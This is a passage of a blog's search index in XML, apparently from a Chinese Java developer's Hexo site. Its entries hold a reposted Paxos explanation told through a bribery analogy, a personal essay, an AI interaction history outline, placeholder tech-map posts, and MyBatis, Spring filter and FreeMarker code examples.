&lt;context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/&gt; &lt;context:exclude-filter type="annotation" expression="org.springframework.web.bind.annotation.ControllerAdvice"/&gt;&lt;/context:component-scan&gt;]]></content>
      <categories>
        <category>java</category>
        <category>exception</category>
      </categories>
      <tags>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[paxos【转】]]></title>
    <url>%2F2017%2F07%2F08%2Falgorithm%2Fpaxos%2F</url>
    <content type="text"><![CDATA[wiki-paxos zk 原理 watcher 监听 paxos转载地址：http://www.cnblogs.com/endsock/p/3480093.html {———-} 123456789101112131415161718192021在paxos算法中，分为4种角色： Proposer ：提议者 Acceptor：决策者 Client：产生议题者 Learner：最终决策学习者上面4种角色中，提议者和决策者是很重要的，其他的2个角色在整个算法中应该算做打酱油的，Proposer就像Client的使者，由Proposer使者拿着Client的议题去向Acceptor提议，让Acceptor来决策。这里上面出现了个新名词：最终决策。现在来系统的介绍一下paxos算法中所有的行为： 1、Proposer提出议题 2、Acceptor初步接受 或者 Acceptor初步不接受 3、如果上一步Acceptor初步接受则Proposer再次向Acceptor确认是否最终接受 4、Acceptor 最终接受 或者Acceptor 最终不接受 5、上面Learner最终学习的目标是Acceptor们最终接受了什么议题？注意，这里是向所有Acceptor学习， 6、如果有多数派个Acceptor最终接受了某提议，那就得到了最终的结果，算法的目的就达到了。 画一幅图来更加直观： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273 为什么需要3个Acceptor？因为Acceptor必须是最少大于等于3个，并且必须是奇数个， 因为要形成多数派嘛，如果是偶数个，比如4个，2个接受2个不接受，各执己见，没法搞下去了。 为什么是3个Proposer？ 其实无所谓是多少个了，1~n 都可以的；如果是1个proposer，毫无竞争压力，很顺利的完成2阶段提交， Acceptor们最终批准了事。如果是多个proposer就比较复杂了，请继续看。 上面的图中是画了很多节点的，每个节点需要一台机器么？答案是不需要的，上面的图是逻辑图， 物理中，可以将Acceptor和Proposer以及Client放到一台机器上，只是使用了不同的端口号罢了， Acceptor们启动不同端口的TCP监听，Proposer来主动连接即可； 完全可以将Client、Proposer、Acceptor、Learner合并到一个程序里面；这里举一个例子： 比如开发一个JOB程序，JOB程序部署在多台服务器上(数量为奇数)，这些JOB有可能同时处理一项任务， 现在使用paxos算法让这些JOB自己来商量由谁(哪台机器)来处理这项任务，这样JOB程序里就需要包含Client、 Proposer、Acceptor、Learner这4大功能，并且需要配置其他JOB服务器的IP地址。再举一个例子，zookeeper常常用来做分布式事务锁。Zookeeper所使用的zad协议也是类似paxos协议的。 所有分布式自协商一致性算法都是paxos算法的简化或者变种。 Client是使用zookeeper服务的机器，Zookeeper自身包含了Acceptor, Proposer, Learner。 Zookeeper领导选举就是paxos过程，还有Client对Zookeeper写Znode时，也是要进行Paxos过程的， 因为不同Client可能连接不同的Zookeeper服务器来写Znode，到底哪个Client才能写成功？ 需要依靠Zookeeper的paxos保证一致性，写成功Znode的Client自然就是被最终接受了， Znode包含了写入Client的IP与端口，其他的Client也可以读取到这个Znode来进行Learner。 也就是说在Zookeeper自身包含了Learner(因为Zookeeper为了保证自身的一致性而会进行领导选举， 所以需要有Learner的内部机制，多个Zookeeper服务器之间需要知道现在谁是领导了)， Client端也可以Learner，Learner是广义的。 现在通过一则故事来学习paxos的算法的流程(2阶段提交)，有2个Client(老板，老板之间是竞争关系)和3个Acceptor(政府官员)：现在需要对一项议题来进行paxos过程，议题是“A项目我要中标！”，这里的“我”指每个带着他的秘书Proposer的Client老板。 Proposer当然听老板的话了，赶紧带着议题和现金去找Acceptor政府官员。 作为政府官员，当然想谁给的钱多就把项目给谁。 Proposer-1小姐带着现金同时找到了Acceptor-1~Acceptor-3官员，1与2号官员分别收取了10比特币，找到第3号官员时， 没想到遭到了3号官员的鄙视，3号官员告诉她，Proposer-2给了11比特币。 不过没关系，Proposer-1已经得到了1,2两个官员的认可，形成了多数派(如果没有形成多数派， Proposer-1会去银行提款在来找官员们给每人20比特币，这个过程一直重复每次+10比特币，直到多数派的形成)， 满意的找老板复命去了，但是此时Proposer-2保镖找到了1,2号官员，分别给了他们11比特币， 1,2号官员的态度立刻转变，都说Proposer-2的老板懂事，这下子Proposer-2放心了，搞定了3个官员， 找老板复命去了，当然这个过程是第一阶段提交，只是官员们初步接受贿赂而已。 故事中的比特币是编号，议题是value。 这个过程保证了在某一时刻，某一个proposer的议题会形成一个多数派进行初步支持； ===============华丽的分割线，第一阶段结束================ 5. 现在进入第二阶段提交，现在proposer-1小姐使用分身术(多线程并发)分了3个自己分别去找3位官员， 最先找到了1号官员签合同，遭到了1号官员的鄙视，1号官员告诉他proposer-2先生给了他11比特币， 因为上一条规则的性质proposer-1小姐知道proposer-2第一阶段在她之后又形成了多数派(至少有2位官员的赃款被更新了); 此时她赶紧去提款准备重新贿赂这3个官员(重新进入第一阶段)，每人20比特币。 刚给1号官员20比特币， 1号官员很高兴初步接受了议题，还没来得及见到2,3号官员的时候 这时proposer-2先生也使用分身术分别找3位官员(注意这里是proposer-2的第二阶段)，被第1号官员拒绝了告诉他收到了20比特币， 第2,3号官员顺利签了合同，这时2，3号官员记录client-2老板用了11比特币中标，因为形成了多数派， 所以最终接受了Client2老板中标这个议题，对于proposer-2先生已经出色的完成了工作； 这时proposer-1小姐找到了2号官员，官员告诉她合同已经签了，将合同给她看，proposer-1小姐是一个没有什么职业操守的聪明人， 觉得跟Client1老板混没什么前途，所以将自己的议题修改为“Client2老板中标”，并且给了2号官员20比特币，这样形成了一个多数派。 顺利的再次进入第二阶段。由于此时没有人竞争了，顺利的找3位官员签合同，3位官员看到议题与上次一次的合同是一致的， 所以最终接受了，形成了多数派，proposer-1小姐跳槽到Client2老板的公司去了。===============华丽的分割线，第二阶段结束=============== Paxos过程结束了，这样，一致性得到了保证，算法运行到最后所有的proposer都投“client2中标”所有的acceptor都接受这个议题， 也就是说在最初的第二阶段，议题是先入为主的，谁先占了先机，后面的proposer在第一阶段就会学习到这个议题而修改自己本身的议题， 因为这样没职业操守，才能让一致性得到保证，这就是paxos算法的一个过程。 原来paxos算法里的角色都是这样的不靠谱，不过没关系，结果靠谱就可以了。该算法就是为了追求结果的一致性。 两阶段提交解决分布式事务 有瑕疵 还有个三阶段提交 2pc、3pc概念 以后再整理 一致性hash：https://www.cnblogs.com/lpfuture/p/5796398.html]]></content>
      <categories>
        <category>java</category>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随便写点]]></title>
    <url>%2F2017%2F07%2F06%2Fessay%2Fessay-1%2F</url>
    <content type="text"><![CDATA[做人、莫为了钱背信弃义做事、一定要有自己的判断感情、去了就去了、别纠缠不清{———-} 过往、平淡如水人这一辈子、总会有许多错误、 在你迷茫不知前路的年纪、总会犯下许许多多的错误、 当你的人生回归正道的时候、也需要为你犯下的错误而偿还代价 错过的人、错过的事、错误的选择、 弯路也是路、认清现在的自己、看清楚未来的自己、才会丢掉迷失的自己、不后悔、 我不能改变我以前做的错事、但可以以此为鉴、在今后的生活中、选择正确的、 谁的人生没有痛苦、想想这些、就算了吧、会更好的、一切都会更好的 引子 山不在高、有仙则灵 水不在深、有龙则灵 世事无相、相由心生 可见之物、实为非物 可感之事、实为非事 物事皆空、空为心瘴 俗人之心、处处皆狱 唯有化世、堪为无我 我即为世、世即为我 道可道.非常道.名可名.非常名 人生就像一壶酒。有苦有辣有辛酸。有梦有泪有遗憾。 没钱的人是苦涩的一生。有钱的人是短暂的一生。 有时候越想没有遗憾，遗憾越多。 人生郁郁不得意的时候，往往回忆最美。 别跟你女朋友讲多喝点热水，请认真的去关爱这个能陪伴你一生的人。 人的一生，二十岁往后就会失陷，名.利.权. 请多花点心思在爱你的人身上，别在最后的时间里，遗憾一生。 别累垮了自己，什么情况下请关心自己，大家都会理解。 每个百毒不侵的人，都曾被深深的伤害过。 当心爱的人离开，你才明白没有人能陪你走到永远。 当时间消磨掉了你的热情，你便会发现，那些曾令你歇斯底里的去执著的人，现已变得可有可无。 描述卡耐基的一段话12345678910111213我从未看到过有人像他这般富有想象力、无穷的智慧以及透彻的理解力、他能读懂你的思想，并把你的一切行为和思想都储存到他的脑海中、你尚未开口，他似乎已经知道你要说什么，他思维敏捷，而且他还有一种深入观察的习惯，这使得他能了解每一件事。但他最杰出的天赋才能是具有激烈他人的能力、他身上总散发着一种自信。若你对某些事情有些疑惑，可以可卡耐基先生讨论，他会立刻使你明白你自己的想法是正确的并使你绝对相信你自己的想法，甚至他也会指出其中的弱点，从而消除你的疑惑、这种吸引人、鼓舞人的个性来自于他的自信。他的领导成就是有目共睹的。我想、在企业史上、除了他之外，再也难以找到一个像他这样的人、对自己的企业细节一无所知、而且本人丝毫不懂钢铁或者工程技术、但却建立起了一个如此庞大的企业王国。 题外箴言 能力就是有组织地努力、 这一能力包括你的教育程度、你的才智、你的承受力、你的性格、以及你的品格。]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI 人机交互发展史]]></title>
    <url>%2F2017%2F07%2F04%2Fai%2Fai-001%2F</url>
    <content type="text"><![CDATA[起源发展人机交互发展历程 PC时代 键盘+鼠标 移动互联网时代 多点触摸、手写、手势、siri语音交互 android ios {———-} 智能生活时代 语音交互发展路径 具备语音能力的app 实体语音按键 无需按键语音唤醒 远场全双工无需重复唤醒 【讯飞AIUI】 多模态交互机器人 语音交互痛点 语音识别不准 环境嘈杂、离得远、方言口音 垂直领域术语、个性化词汇 语义理解不对 上下文关联、场景相关 实体取名复杂 垂直领域实体歧义 口语化、尝试北京、省略说法 信息内容不足 即时性 可用性 授权 系统响应单一 机器反馈方式缺少变化 缺少通用对话管理策略 机器翻译技术发展史 基于规则的机器翻译 IBM提出的基于词的统计翻译模型 Koehn提出基于短语的统计翻译模型 谷歌和蒙特利尔大学提出端到端神经机器翻译 蒙特利尔大学引入Attention机制、解决场景翻译难点 谷歌发布 transformer系统 三大技术路线 规则机器翻译 openLogos--开源、 三个技术路线：直接翻译、借助词典；句法树翻译、借助词典；中间语言来翻译 优点 保持原文结构 对于语言现象已知或者结构规范的源语言效果较好 缺点 人工编写、工作量大 主观性强、一致性难以保障 不利于系统扩充 无法解决不规范语言翻译 统计机器翻译 神经机器翻译]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jvm 垃圾回收 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-jvm-garbage%2F</url>
    <content type="text"><![CDATA[收集到的 jvm 垃圾回收 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[云计算 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-cloud-computing%2F</url>
    <content type="text"><![CDATA[收集到的 云计算 图谱收集到的 云计算 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[容器 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-container%2F</url>
    <content type="text"><![CDATA[收集到的 容器 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-design-model-1%2F</url>
    <content type="text"><![CDATA[收集到的 设计模式 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-devops%2F</url>
    <content type="text"><![CDATA[收集到的 DevOps 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[嵌入式 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-embedded%2F</url>
    <content type="text"><![CDATA[收集到的 嵌入式 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hadoop 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-hadoop%2F</url>
    <content type="text"><![CDATA[收集到的 hadoop 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOS图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-ios%2F</url>
    <content type="text"><![CDATA[收集到的 IOS 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java 集合 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-java-collection%2F</url>
    <content type="text"><![CDATA[收集到的 java 集合 图谱收集到的 java 集合 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java 并发 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-java-concurrent%2F</url>
    <content type="text"><![CDATA[收集到的 java 并发 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[架构师图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-architecture-0%2F</url>
    <content type="text"><![CDATA[收集到的 架构师 图谱收集到的 架构师 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java map 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-java-map%2F</url>
    <content type="text"><![CDATA[收集到的 java map 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java set 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-java-set%2F</url>
    <content type="text"><![CDATA[收集到的 java set 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端测试 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-app-test%2F</url>
    <content type="text"><![CDATA[收集到的 移动端测试 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件发布 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-release%2F</url>
    <content type="text"><![CDATA[收集到的 软件发布 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微服务图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-microservice%2F</url>
    <content type="text"><![CDATA[收集到的 微服务 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运维 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-maintenance%2F</url>
    <content type="text"><![CDATA[收集到的 运维 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenResty 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-openresty%2F</url>
    <content type="text"><![CDATA[收集到的 OpenResty 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全秘籍图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-security%2F</url>
    <content type="text"><![CDATA[收集到的 安全秘籍 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件工程 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-software%2F</url>
    <content type="text"><![CDATA[收集到的 软件工程 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端技能 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-web%2F</url>
    <content type="text"><![CDATA[收集到的 前端技能 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开发语言宝典 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-voice%2F</url>
    <content type="text"><![CDATA[收集到的 开发语言宝典 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[架构师方法论图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-architecture-1%2F</url>
    <content type="text"><![CDATA[收集到的 架构师方法论 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数据 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-big-data%2F</url>
    <content type="text"><![CDATA[收集到的 大数据 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里巴巴常用小框架图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-alibaba-software-0%2F</url>
    <content type="text"><![CDATA[收集到的 阿里巴巴常用小框架 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[互联网大流量的方法图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-Internet-traffic%2F</url>
    <content type="text"><![CDATA[收集到的 互联网大流量的方法 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一致性图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-consistency%2F</url>
    <content type="text"><![CDATA[收集到的 一致性 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java list 图谱]]></title>
    <url>%2F2017%2F06%2F13%2Fxmind%2Fother%2Fxmind-java-list%2F</url>
    <content type="text"><![CDATA[收集到的 java list 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>收集的技术图谱</category>
      </categories>
      <tags>
        <tag>IT技能图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mybatis实例]]></title>
    <url>%2F2017%2F03%2F24%2Fmysql%2Fmybatis-example%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819&lt;!-- 批量插入 遇到重复key 改为更新 需求设定--&gt; &lt;insert id=&quot;addBatchDepartment&quot; parameterType=&quot;java.util.List&quot; &gt; INSERT INTO department ( branchId, branchName, common, spellId) VALUES &lt;foreach collection=&quot;list&quot; item=&quot;item&quot; index=&quot;index&quot; separator=&quot;,&quot; &gt; ( #&#123;item.branchId&#125;, #&#123;item.branchName&#125;, #&#123;item.common&#125;, #&#123;item.spellId&#125; ) &lt;/foreach&gt; ON DUPLICATE KEY UPDATE branchId = values(branchId) &lt;/insert&gt; {———-}增 12345678910&lt;insert id=&quot;addStudent&quot; parameterType=&quot;java.util.Map&quot;&gt;insert into student(id,name,age)values( #&#123;item.id&#125;, #&#123;item.name&#125;, #&#123;item.age&#125;)&lt;/insert&gt; 批量 12345678910111213&lt;insert id=&quot;addStudent&quot; parameterType=&quot;java.util.Map&quot;&gt;insert into student(id,name,age,start_time)values &lt;foreach collection=&quot;list&quot; item=&quot;item&quot; index=&quot;index&quot; separator=&quot;,&quot;&gt;( #&#123;item.id&#125;, #&#123;item.name&#125;, #&#123;item.age&#125;, now())&lt;/foreach&gt; &lt;/insert&gt; 删 1这里写代码片 批量 改 123456789101112&lt;update id=&quot;updateStudent&quot; parameterType=&quot;java.util.Map&quot;&gt; update student &lt;set&gt; &lt;if test=&quot;userid != null and userid != &apos;&apos; &quot;&gt; userid=#&#123;userid&#125;, &lt;/if&gt; &lt;/set&gt; where 1=1&lt;if test=&quot;id!= null and id!= &apos;&apos; &quot;&gt; and id=#&#123;id&#125;&lt;/if&gt; &lt;/update&gt; 批量 12345678&lt;update id=&quot;updateStudent&quot; parameterType=&quot;java.util.Map&quot;&gt; update student set state=2 where 1=1 and id in &lt;foreach item=&quot;item&quot; index=&quot;index&quot; collection=&quot;list&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;item&#125; &lt;/foreach&gt; &lt;/update&gt; 1234567891011121314&lt;update id=&quot;editStudent&quot; parameterType=&quot;java.util.List&quot;&gt; &lt;foreach collection=&quot;list&quot; item=&quot;item&quot; index=&quot;index&quot; separator=&quot;;&quot;&gt; update ware_service &lt;set&gt; &lt;if test=&quot;item.endTime!=null and item.endTime!=&apos;&apos;&quot;&gt; end_time=#&#123;item.endTime&#125;, &lt;/if&gt; &lt;if test=&quot;item.redeemcode!=null and item.redeemcode!=&apos;&apos;&quot;&gt; redeemcode=#&#123;item.redeemcode&#125; &lt;/if&gt; &lt;/set&gt; where id=#&#123;item.id&#125; &lt;/foreach&gt; &lt;/update&gt; 批量修改需设置db.properties新增 &amp;allowMultiQueries=true 查 123456789101112 &lt;select id=&quot;getAllStudent&quot; resultType=com.mofangge.entity.student&quot; parameterType=&quot;java.util.Map&quot;&gt; selectid,name,age,start_time as startTimefrom student where 1=1 &lt;if test=&quot;userid != null and userid != &apos;&apos; &quot;&gt; and userid=#&#123;userid&#125; &lt;/if&gt;and end_time &gt; now() &lt;/select&gt; 批量 123456789101112131415&lt;select id=&quot;getAllStudents&quot; resultType=&quot;com.mofangge.entity.student&quot; parameterType=&quot;java.util.Map&quot;&gt; select id, name, age, start_time as startTime from student where 1=1 and age in &lt;foreach collection=&quot;list&quot; index=&quot;index&quot; item=&quot;item&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;item&#125; &lt;/foreach&gt; and end_time &gt; now() &lt;if test=&quot;userid!=null and userid!=&apos;&apos;&quot;&gt; and userid=#&#123;userid&#125; &lt;/if&gt; &lt;/select&gt; 1234567891011121314&lt;select id=&quot;getAllStudent&quot; resultType=&quot;com.mofangge.entity.Student&quot; parameterType=&quot;java.util.Map&quot;&gt; select id, name, age, from student where 1=1 and code in &lt;foreach collection=&quot;list&quot; index=&quot;index&quot; item=&quot;item&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;item&#125; &lt;/foreach&gt; and end_time &gt; now() &lt;if test=&quot;id!=null and id!=&apos;&apos;&quot;&gt; and id=#&#123;id&#125; &lt;/if&gt; &lt;/select&gt; mybatis大于小于写法123456789101112原符号 &lt; &lt;= &gt; &gt;= &amp; &apos; &quot;替换符号 &amp;lt; &amp;lt;= &amp;gt; &amp;gt;= &amp;amp; &amp;apos; &amp;quot;例如：sql如下：create_date_time &amp;gt;= #&#123;startTime&#125; and create_date_time &amp;lt;= #&#123;endTime&#125;第二种写法（2）：大于等于&lt;![CDATA[ &gt;= ]]&gt;小于等于&lt;![CDATA[ &lt;= ]]&gt;例如：sql如下：create_date_time &lt;![CDATA[ &gt;= ]]&gt; #&#123;startTime&#125; and create_date_time &lt;![CDATA[ &lt;= ]]&gt; #&#123;endTime&#125;]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring filter 注入service]]></title>
    <url>%2F2017%2F03%2F06%2Fexception%2Fexception-1%2F</url>
    <content type="text"><![CDATA[需求背景：spring filter 注入service 查询数据库 通过直接注入方式 service 一直是 null 解决办法12345678910111213141516171819public class AppFilter implements Filter &#123; private AkskService akskService;//这个就是需要注入的service public void destroy() &#123; &#125; public void doFilter(ServletRequest servletReq, ServletResponse servletRes, FilterChain chain) throws IOException, ServletException &#123; HttpServletRequest request = (HttpServletRequest) servletReq; HttpServletResponse response = (HttpServletResponse) servletRes; &#125; public void init(FilterConfig config) throws ServletException &#123; ServletContext context = config.getServletContext();//这里获取applicationContext ApplicationContext ctx = WebApplicationContextUtils.getWebApplicationContext(context); akskService = (AkskService) ctx.getBean(AkskService.class); &#125;&#125;]]></content>
      <categories>
        <category>java</category>
        <category>exception</category>
      </categories>
      <tags>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[freemarker 示例]]></title>
    <url>%2F2016%2F11%2F11%2Fessay%2Fessay-17%2F</url>
    <content type="text"><![CDATA[判断字符串长度 时间格式化 数字格式化 显示boolean值 非空判断 list遍历 {———-} 判断字符串长度123456&lt;#if list.startTime?length lt 6&gt; &lt;p&gt;预定时间 &lt;span&gt;&lt;br/&gt;$&#123;list.startTime!&#125;-$&#123;list.endTime!&#125;&lt;/span&gt;&lt;/p&gt;&lt;/#if&gt;&lt;#if list.startTime?length gt 6&gt; &lt;p&gt;预定时间 &lt;span&gt;&lt;br/&gt;$&#123;list.startTime!&#125;&lt;br/&gt;$&#123;list.endTime!&#125;&lt;/span&gt;&lt;/p&gt;&lt;/#if&gt; 时间格式化12自己指定格式是这样$&#123;dateVar?string(&quot;yyyy-MM-dd HH:mm:ss zzzz&quot;)&#125; 数字格式化123456&lt;#assign tempNum=20&gt; $&#123;tempNum&#125;$&#123;tempNum?c&#125; 去掉整型中的&quot;,&quot;$&#123;tempNum?string.number&#125;或$&#123;tempNum?string(“number”)&#125; 结果为20 $&#123;tempNum?string.currency&#125;或$&#123;tempNum?string(“currency”)&#125; 结果为￥20.00 $&#123;tempNum?string. percent&#125;或$&#123;tempNum?string(“percent”)&#125; 结果为2,000% 显示boolean值12&lt;#assign foo=true/&gt; $&#123;foo?string(&quot;yes&quot;, &quot;no&quot;)&#125; 非空判断1&lt;h2&gt;$&#123;list.title!&#125;&lt;/h2&gt; list遍历 12345&lt;#list listProduct as list&gt; &lt;#list list.list01 as list01&gt; &lt;td&gt;$&#123;list01.name!&#125;&lt;td&gt; &lt;/#list&gt;&lt;/#list&gt;]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
</search>
